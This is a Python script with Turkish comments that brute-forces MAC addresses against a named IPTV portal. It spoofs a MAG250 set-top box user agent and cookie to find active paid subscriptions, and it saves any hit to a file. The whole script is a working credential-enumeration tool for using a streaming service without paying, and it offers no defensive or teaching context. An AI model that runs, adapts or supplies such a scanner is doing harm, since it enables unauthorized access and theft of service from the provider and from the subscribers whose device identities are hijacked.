import requests
import concurrent.futures

# Hedef portal
portal_url = "http://dm.lion-ott.com/c/"

def mac_ureticisi():
    liste = []
    # Çalıştığını bildiğin blok: 00:1A:79:7C:6B
    # Son iki haneyi (B2 gibi) 00'dan FF'e kadar tarayacağız (256 ihtimal)
    base = "00:1A:79:7C:6B"
    
    for i in range(256):
        # Hex formatına çevirip (0x...) sadece son iki karakteri alıyoruz
        son = hex(i)[2:].zfill(2).upper()
        liste.append(f"{base}:{son}")
    return liste

def tekli_kontrol(mac):
    headers = {
        'User-Agent': 'MAG250',
        'X-User-Agent': 'Model: MAG250; SW: 2.14.03-r6',
        'Cookie': f'mac={mac};'
    }
    try:
        # Hızlı sonuç için timeout'u 10 saniye yapıyoruz
        response = requests.get(portal_url, headers=headers, timeout=10)
        
        # Eğer sayfa yüklenirse (200), bu bir çalışan aboneliktir
        if response.status_code == 200:
            print(f"🔥 BULDUM: {mac}")
            return f"{portal_url} | {mac}"
    except:
        pass
    return None

def baslat():
    denenecekler = mac_ureticisi()
    print(f"🚀 Yeni blok ({len(denenecekler)} adres) taranıyor...")
    
    calisanlar = []
    # GitHub'ın gücünü kullanarak 25 thread (eşzamanlı istek) açıyoruz
    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
        sonuclar = list(executor.map(tekli_kontrol, denenecekler))
        calisanlar = [s for s in sonuclar if s]

    if calisanlar:
        with open("calisan_maclar.txt", "a") as f:
            for m in calisanlar:
                f.write(m + "\n")
        print(f"\n✅ {len(calisanlar)} adet aktif adres listeye eklendi!")
    else:
        print("\n😔 Bu blokta başka aktif adres bulunamadı.")

if __name__ == "__main__":
    baslat()
